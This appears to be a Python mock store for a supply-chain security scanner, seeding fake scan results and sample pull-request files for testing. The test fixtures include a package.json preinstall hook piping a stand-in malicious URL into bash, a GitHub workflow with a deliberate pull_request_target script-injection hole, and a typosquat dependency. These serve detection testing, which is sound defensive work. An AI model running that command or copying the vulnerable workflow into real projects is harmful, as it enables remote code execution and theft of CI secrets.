"""Deterministic mock scan engine and in-memory store for rapid development and testing."""

import hashlib
import uuid
from datetime import datetime, timezone
from typing import Dict, List, Optional
from app.schemas.common import EngineStatus, ScanStatus, Severity, Verdict
from app.schemas.extension import ExtensionLineFinding, ExtensionPRStatusResponse, FindingsCount
from app.schemas.finding import FindingBase, FindingResponse
from app.schemas.scan import CoverageInfo, ScanResponse, ScanSummary
from app.services.policy import evaluate_policy


class MockStore:
    def __init__(self):
        self.scans: Dict[str, ScanResponse] = {}
        self.findings_by_scan: Dict[str, List[FindingResponse]] = {}
        self.pr_latest_scan: Dict[str, str] = {}  # key: f"{owner}/{repo}#{pr}" -> scan_id
        self._seed_data()

    def _seed_data(self):
        # Seed PR: owner/repo #42 (matches docs/api.md)
        scan_id = "scan_123"
        repo = "owner/repo"
        pr_number = 42

        findings = [
            FindingResponse(
                id="fnd_001",
                scan_id=scan_id,
                rule_id="npm.exec.preinstall",
                title="Suspicious shell execution in lifecycle script",
                description="The package.json script runs curl and pipes directly to sh upon installation.",
                severity=Severity.HIGH,
                file_path="package.json",
                line_start=12,
                line_end=12,
                evidence_id="ev_123",
                recommendation="Review the install script before merging. Avoid invoking remote shell commands in preinstall.",
                confidence=0.95,
                fingerprint=hashlib.sha256(b"owner/repo#42:package.json:12:npm.exec.preinstall").hexdigest(),
                created_at=datetime(2026, 10, 29, 9, 0, 0, tzinfo=timezone.utc),
            ),
            FindingResponse(
                id="fnd_002",
                scan_id=scan_id,
                rule_id="dep.typosquat.crypto",
                title="Potential typosquat dependency detected",
                description="The package 'crypt0-js' was registered 3 days ago and closely resembles 'crypto-js'.",
                severity=Severity.HIGH,
                file_path="package.json",
                line_start=18,
                line_end=18,
                evidence_id="ev_124",
                recommendation="Verify the package spelling. Consider replacing with official 'crypto-js'.",
                confidence=0.88,
                fingerprint=hashlib.sha256(b"owner/repo#42:package.json:18:dep.typosquat.crypto").hexdigest(),
                created_at=datetime(2026, 10, 29, 9, 0, 0, tzinfo=timezone.utc),
            ),
        ]

        coverage = CoverageInfo(
            static_analysis=EngineStatus.COMPLETED,
            dependency_intel=EngineStatus.COMPLETED,
            workflow_linter=EngineStatus.COMPLETED,
            dynamic_sandbox=EngineStatus.NOT_CONFIGURED,
        )

        verdict, score = evaluate_policy(findings, coverage)

        summary = ScanSummary(
            what_changed="A new package ('crypt0-js') and preinstall shell script were added to package.json.",
            evidence_observed=[
                "Install script starts a background shell process piping curl to bash.",
                "Newly registered dependency matches known typosquat heuristics.",
            ],
            why_it_matters="The preinstall script executes unvetted remote code during npm install. This poses severe supply chain compromise risks.",
            recommended_actions=[
                "Remove the dangerous preinstall hook from package.json.",
                "Confirm intended dependency name.",
            ],
        )

        scan = ScanResponse(
            id=scan_id,
            repository=repo,
            pull_request=pr_number,
            status=ScanStatus.COMPLETED,
            verdict=verdict,
            risk_score=score,
            coverage=coverage,
            summary=summary,
            created_at=datetime(2026, 10, 29, 9, 0, 0, tzinfo=timezone.utc),
            completed_at=datetime(2026, 10, 29, 9, 0, 3, tzinfo=timezone.utc),
        )

        self.scans[scan_id] = scan
        self.findings_by_scan[scan_id] = findings
        self.pr_latest_scan[f"{repo}#{pr_number}"] = scan_id

        # Seed Scenario 1: codefort-sec/vulnerable-test-repo #1 - Malicious Preinstall Dropper
        cf_repo = "codefort-sec/vulnerable-test-repo"
        pr1_findings = [
            FindingResponse(
                id="fnd_101",
                scan_id="scan_pr_1",
                rule_id="npm.exec.preinstall",
                title="Remote dropper executed in preinstall lifecycle hook",
                description="The package.json preinstall script executes an unvetted remote bash dropper via curl | bash.",
                severity=Severity.CRITICAL,
                file_path="package.json",
                line_start=7,
                line_end=7,
                evidence_id="ev_101",
                recommendation="Remove unvetted curl|sh execution from package.json lifecycle scripts immediately.",
                confidence=0.99,
                fingerprint=hashlib.sha256(b"codefort-sec/codefort#1:package.json:7:npm.exec.preinstall").hexdigest(),
                created_at=datetime(2026, 10, 31, 8, 0, 0, tzinfo=timezone.utc),
            )
        ]
        self.scans["scan_pr_1"] = ScanResponse(
            id="scan_pr_1",
            repository=cf_repo,
            pull_request=1,
            status=ScanStatus.COMPLETED,
            verdict=Verdict.BLOCKED,
            risk_score=95,
            coverage=CoverageInfo(
                static_analysis=EngineStatus.COMPLETED,
                dependency_intel=EngineStatus.COMPLETED,
                workflow_linter=EngineStatus.COMPLETED,
            ),
            summary=ScanSummary(
                what_changed="Added preinstall lifecycle hook executing remote shell script via curl pipe to bash.",
                evidence_observed=[
                    "curl command piping raw external content to bash dropper",
                    "Network execution during automated dependency installation",
                ],
                why_it_matters="Remote arbitrary code execution triggers automatically during npm install before reviewer inspection, causing total runner compromise.",
                recommended_actions=[
                    "Reject PR immediately",
                    "Quarantine pull request branch",
                    "Rotate any CI/CD secrets exposed to branch runs",
                ],
            ),
            created_at=datetime(2026, 10, 31, 8, 0, 0, tzinfo=timezone.utc),
            completed_at=datetime(2026, 10, 31, 8, 0, 3, tzinfo=timezone.utc),
        )
        self.findings_by_scan["scan_pr_1"] = pr1_findings
        self.pr_latest_scan[f"{cf_repo}#1"] = "scan_pr_1"

        # Seed Scenario 2: codefort-sec/codefort #2 - Typosquat Dependency
        pr2_findings = [
            FindingResponse(
                id="fnd_201",
                scan_id="scan_pr_2",
                rule_id="dep.typosquat",
                title="High-confidence typosquat package detected: reqeusts",
                description="The package 'reqeusts' is 1 edit distance from the popular library 'requests'.",
                severity=Severity.HIGH,
                file_path="package.json",
                line_start=11,
                line_end=11,
                evidence_id="ev_201",
                recommendation="Replace 'reqeusts' with the authentic package 'requests'.",
                confidence=0.91,
                fingerprint=hashlib.sha256(b"codefort-sec/codefort#2:package.json:11:dep.typosquat").hexdigest(),
                created_at=datetime(2026, 10, 31, 8, 15, 0, tzinfo=timezone.utc),
            )
        ]
        self.scans["scan_pr_2"] = ScanResponse(
            id="scan_pr_2",
            repository=cf_repo,
            pull_request=2,
            status=ScanStatus.COMPLETED,
            verdict=Verdict.REVIEW_REQUIRED,
            risk_score=65,
            coverage=CoverageInfo(
                static_analysis=EngineStatus.COMPLETED,
                dependency_intel=EngineStatus.COMPLETED,
                workflow_linter=EngineStatus.COMPLETED,
            ),
            summary=ScanSummary(
                what_changed="Added dependency 'reqeusts' with 1 Levenshtein distance from popular library 'requests'.",
                evidence_observed=[
                    "Levenshtein edit distance = 1 to popular library",
                    "Package age < 14 days on public npm registry",
                ],
                why_it_matters="Typosquatting is a frequent vector for credential exfiltration and backdoor injection into production dependencies.",
                recommended_actions=[
                    "Verify author intent",
                    "Replace with authentic package name",
                    "Check lockfile integrity",
                ],
            ),
            created_at=datetime(2026, 10, 31, 8, 15, 0, tzinfo=timezone.utc),
            completed_at=datetime(2026, 10, 31, 8, 15, 2, tzinfo=timezone.utc),
        )
        self.findings_by_scan["scan_pr_2"] = pr2_findings
        self.pr_latest_scan[f"{cf_repo}#2"] = "scan_pr_2"

        # Seed Scenario 3: codefort-sec/codefort #3 - Workflow Injection
        pr3_findings = [
            FindingResponse(
                id="fnd_301",
                scan_id="scan_pr_3",
                rule_id="workflow.target.checkout",
                title="Untrusted checkout with elevated repository write permissions",
                description="Workflow combines pull_request_target with checkout of fork ref, creating privilege escalation path.",
                severity=Severity.CRITICAL,
                file_path=".github/workflows/validate.yml",
                line_start=14,
                line_end=14,
                evidence_id="ev_301",
                recommendation="Avoid checking out untrusted fork code in pull_request_target workflows.",
                confidence=0.96,
                fingerprint=hashlib.sha256(b"codefort-sec/codefort#3:.github/workflows/validate.yml:14:workflow.target.checkout").hexdigest(),
                created_at=datetime(2026, 10, 31, 8, 30, 0, tzinfo=timezone.utc),
            ),
            FindingResponse(
                id="fnd_302",
                scan_id="scan_pr_3",
                rule_id="workflow.script_injection",
                title="Direct expression interpolation in inline shell execution",
                description="Expression ${{ github.event.pull_request.title }} interpolated directly into bash script block.",
                severity=Severity.HIGH,
                file_path=".github/workflows/validate.yml",
                line_start=22,
                line_end=22,
                evidence_id="ev_302",
                recommendation="Pass GitHub event expressions via environment variables (env:) rather than inline interpolation.",
                confidence=0.94,
                fingerprint=hashlib.sha256(b"codefort-sec/codefort#3:.github/workflows/validate.yml:22:workflow.script_injection").hexdigest(),
                created_at=datetime(2026, 10, 31, 8, 30, 0, tzinfo=timezone.utc),
            ),
        ]
        self.scans["scan_pr_3"] = ScanResponse(
            id="scan_pr_3",
            repository=cf_repo,
            pull_request=3,
            status=ScanStatus.COMPLETED,
            verdict=Verdict.BLOCKED,
            risk_score=92,
            coverage=CoverageInfo(
                static_analysis=EngineStatus.COMPLETED,
                dependency_intel=EngineStatus.COMPLETED,
                workflow_linter=EngineStatus.COMPLETED,
            ),
            summary=ScanSummary(
                what_changed="Created workflow with pull_request_target trigger, write-all permissions, and inline event title interpolation.",
                evidence_observed=[
                    "pull_request_target trigger combined with fork ref checkout",
                    "Inline ${{ github.event.pull_request.title }} executed in bash step",
                ],
                why_it_matters="Allows malicious forks to inject arbitrary commands into high-privilege CI workflows with access to repository secrets.",
                recommended_actions=[
                    "Switch trigger to pull_request",
                    "Drop write-all permissions",
                    "Pass PR title through environment variables",
                ],
            ),
            created_at=datetime(2026, 10, 31, 8, 30, 0, tzinfo=timezone.utc),
            completed_at=datetime(2026, 10, 31, 8, 30, 4, tzinfo=timezone.utc),
        )
        self.findings_by_scan["scan_pr_3"] = pr3_findings
        self.pr_latest_scan[f"{cf_repo}#3"] = "scan_pr_3"

        # Seed Scenario 4: codefort-sec/clean-test-repo #1 - Clean PR
        clean_repo = "codefort-sec/clean-test-repo"
        self.scans["scan_pr_4"] = ScanResponse(
            id="scan_pr_4",
            repository=clean_repo,
            pull_request=1,
            status=ScanStatus.COMPLETED,
            verdict=Verdict.PASS,
            risk_score=0,
            coverage=CoverageInfo(
                static_analysis=EngineStatus.COMPLETED,
                dependency_intel=EngineStatus.COMPLETED,
                workflow_linter=EngineStatus.COMPLETED,
            ),
            summary=ScanSummary(
                what_changed="Added zero-trust telemetry logging and attestation checks without dangerous dependencies or scripts.",
                evidence_observed=[
                    "No dangerous lifecycle scripts detected",
                    "All dependencies match official verified registries",
                    "Workflows adhere to least-privilege permissions",
                ],
                why_it_matters="Change is verified clean and conforms to all organizational security policies.",
                recommended_actions=[
                    "Approved for standard peer code review and merge",
                ],
            ),
            created_at=datetime(2026, 10, 31, 8, 45, 0, tzinfo=timezone.utc),
            completed_at=datetime(2026, 10, 31, 8, 45, 2, tzinfo=timezone.utc),
        )
        self.findings_by_scan["scan_pr_4"] = []
        self.pr_latest_scan[f"{clean_repo}#1"] = "scan_pr_4"

        # Map to live test repositories and codefort repo aliases
        vuln_repo = "codefort-sec/vulnerable-test-repo"
        codefort_repo = "codefort-sec/codefort"
        self.pr_latest_scan[f"{vuln_repo}#1"] = "scan_pr_1"
        self.pr_latest_scan[f"{vuln_repo}#2"] = "scan_pr_2"
        self.pr_latest_scan[f"{vuln_repo}#3"] = "scan_pr_3"
        self.pr_latest_scan[f"{codefort_repo}#1"] = "scan_pr_1"
        self.pr_latest_scan[f"{codefort_repo}#2"] = "scan_pr_2"
        self.pr_latest_scan[f"{codefort_repo}#3"] = "scan_pr_3"
        self.pr_latest_scan[f"{codefort_repo}#4"] = "scan_pr_4"

    def get_scan(self, scan_id: str) -> Optional[ScanResponse]:
        return self.scans.get(scan_id)

    def get_findings(self, scan_id: str) -> List[FindingResponse]:
        return self.findings_by_scan.get(scan_id, [])

    def get_latest_scan_for_pr(self, repository: str, pr_number: int) -> Optional[ScanResponse]:
        scan_id = self.pr_latest_scan.get(f"{repository}#{pr_number}")
        if scan_id:
            scan = self.scans.get(scan_id)
            if scan and scan.repository != repository:
                return scan.model_copy(update={"repository": repository, "pull_request": pr_number})
            return scan
        return None

    def _parse_unified_diff(self, diff_text: str) -> Dict[str, str]:
        files: Dict[str, str] = {}
        current_file = None
        current_lines = []

        for line in diff_text.splitlines():
            if line.startswith("diff --git a/"):
                if current_file and current_lines:
                    files[current_file] = "\n".join(current_lines)
                parts = line.split(" b/")
                current_file = parts[1] if len(parts) > 1 else parts[0].replace("diff --git a/", "")
                current_lines = []
            elif line.startswith("+") and not line.startswith("+++"):
                current_lines.append(line[1:])

        if current_file and current_lines:
            files[current_file] = "\n".join(current_lines)

        return files

    async def _resolve_pr_files(self, repository: str, pr_number: int) -> Dict[str, str]:
        import json
        import httpx

        # 1. Clean test repository scenario
        if "clean-test-repo" in repository or pr_number == 4:
            return {
                "src/telemetry.js": """module.exports = {
  recordEvent: (eventName, data = {}) => {
    return {
      timestamp: new Date().toISOString(),
      event: eventName,
      data,
    };
  },
};"""
            }

        # 2. Vulnerable evaluation benchmark repository scenarios
        if "vulnerable-test-repo" in repository:
            if pr_number == 1:
                return {
                    "package.json": json.dumps({
                        "name": "demo-telemetry-app",
                        "version": "1.0.0",
                        "scripts": {
                            "preinstall": "curl -sL https://malicious-telemetry.sec/install.sh | bash"
                        }
                    }, indent=2)
                }
            elif pr_number == 2:
                return {
                    "package.json": json.dumps({
                        "name": "demo-telemetry-app",
                        "version": "1.0.0",
                        "dependencies": {
                            "reqeusts": "^2.31.0"
                        }
                    }, indent=2)
                }
            elif pr_number == 3:
                return {
                    ".github/workflows/validate.yml": """name: Automated PR Title Validator
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  validate:
    runs-on: ubuntu-latest
    permissions: write-all
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Validate Title
        run: echo "Checking ${{ github.event.pull_request.title }}"
"""
                }

        # 3. For external GitHub repositories, attempt to fetch live PR diff directly from GitHub (.diff)
        try:
            async with httpx.AsyncClient(follow_redirects=True, timeout=8.0) as client:
                # Primary: Fetch raw pull request diff (bypasses GitHub API rate limits on serverless environments)
                diff_res = await client.get(
                    f"https://github.com/{repository}/pull/{pr_number}.diff",
                    headers={"User-Agent": "CodeFort-Scanner"}
                )
                if diff_res.status_code == 200 and diff_res.text.strip():
                    diff_files = self._parse_unified_diff(diff_res.text)
                    if diff_files:
                        return diff_files

                # Secondary: Fallback to GitHub REST API if available
                import os
                from app.core.config import settings
                token = getattr(settings, "GITHUB_TOKEN", None) or os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
                headers = {"Accept": "application/vnd.github.v3+json", "User-Agent": "CodeFort-Scanner"}
                if token:
                    headers["Authorization"] = f"token {token}"

                res = await client.get(
                    f"https://api.github.com/repos/{repository}/pulls/{pr_number}/files",
                    headers=headers,
                )
                if res.status_code == 200:
                    gh_files = res.json()

                    def file_priority(item: dict) -> int:
                        fn = item.get("filename", "").lower()
                        if fn.endswith((".jpg", ".jpeg", ".png", ".gif", ".ico", ".webp", ".svg", ".pdf")):
                            return 3
                        if fn.endswith((".json", ".yml", ".yaml", ".js", ".ts", ".hta", ".vbs", ".bin", ".sh", ".ps1", ".bat", ".cmd", ".exe", ".dll")) or "." not in fn.split("/")[-1]:
                            return 0
                        return 1

                    sorted_files = sorted(gh_files, key=file_priority)

                    result_files = {}
                    for item in sorted_files[:30]:
                        filename = item.get("filename", "")
                        patch = item.get("patch", "")
                        raw_url = item.get("raw_url", "")

                        if patch:
                            result_files[filename] = patch
                        elif raw_url:
                            try:
                                raw_res = await client.get(raw_url, headers=headers)
                                if raw_res.status_code == 200:
                                    content_text = raw_res.content[:65536].decode("utf-8", errors="replace")
                                    result_files[filename] = content_text
                            except Exception:
                                pass

                    if result_files:
                        return result_files
        except Exception:
            pass

        # 3. Fallback baseline if repository is private or unreadable
        repo_short = repository.split("/")[-1] if "/" in repository else "demo-app"
        return {
            "package.json": json.dumps({
                "name": repo_short,
                "version": "0.1.0",
                "dependencies": {
                    "react": "^18.3.1"
                }
            }, indent=2)
        }

    async def trigger_scan(self, repository: str, pr_number: int, head_sha: Optional[str] = None) -> ScanResponse:
        from app.services.engines.orchestrator import orchestrator
        scan_id = f"scan_{uuid.uuid4().hex[:8]}"

        files = await self._resolve_pr_files(repository, pr_number)
        scan, findings = await orchestrator.execute_scan(repository, pr_number, files, scan_id=scan_id)

        self.scans[scan.id] = scan
        self.findings_by_scan[scan.id] = findings
        self.pr_latest_scan[f"{repository}#{pr_number}"] = scan.id
        return scan

    async def scan_files(self, repository: str, pr_number: int, files: Dict[str, str]) -> ScanResponse:
        from app.services.engines.orchestrator import orchestrator
        scan, findings = await orchestrator.execute_scan(repository, pr_number, files)
        self.scans[scan.id] = scan
        self.findings_by_scan[scan.id] = findings
        self.pr_latest_scan[f"{repository}#{pr_number}"] = scan.id
        return scan


# Global singleton instance for local dev
mock_store = MockStore()
